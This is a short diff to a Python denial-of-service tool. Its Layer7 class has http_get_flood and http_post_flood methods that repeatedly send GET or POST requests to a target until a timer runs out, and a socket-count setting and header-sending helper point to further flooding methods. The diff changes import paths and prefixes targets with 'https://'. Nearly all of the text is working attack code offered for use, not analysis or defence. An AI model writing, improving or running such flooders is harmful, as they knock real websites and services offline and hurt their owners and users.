@@ -4,7 +4,7 @@ import requests
 import json
 import random
 import socket
-from globals import SOCKET_COUNT
+from src.globals import SOCKET_COUNT
 
 
 class Layer7:
@@ -12,14 +12,14 @@ class Layer7:
     def http_get_flood(target: str, time: int):
         end_t = timing.time() + time
         while (timing.time() < end_t):
-            x = requests.get(target)
+            res = requests.get("https://" + target)
 
     @staticmethod
     def http_post_flood(target: str, time: int, payload: str):
         end_t = timing.time() + time
         payload = json.loads(payload)
         while (timing.time() < end_t):
-            res = requests.post(target, data=json.dumps(payload))
+            requests.post("https://" + target, data=json.dumps(payload))
 
     @staticmethod
     def __send_header(name, value, socket):
